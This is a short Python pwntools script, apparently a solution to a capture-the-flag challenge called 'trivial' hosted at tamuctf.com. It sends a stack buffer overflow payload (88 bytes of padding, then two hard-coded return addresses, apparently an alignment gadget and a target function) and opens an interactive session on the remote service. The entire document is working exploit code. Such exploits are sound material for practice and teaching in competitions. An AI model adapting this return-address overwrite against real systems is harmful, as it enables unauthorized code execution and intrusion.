from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="trivial")


payload = b"A"*88
payload += p64(0x0000000000401016)
payload += p64(0x401132)
p.sendline(payload)
p.interactive()
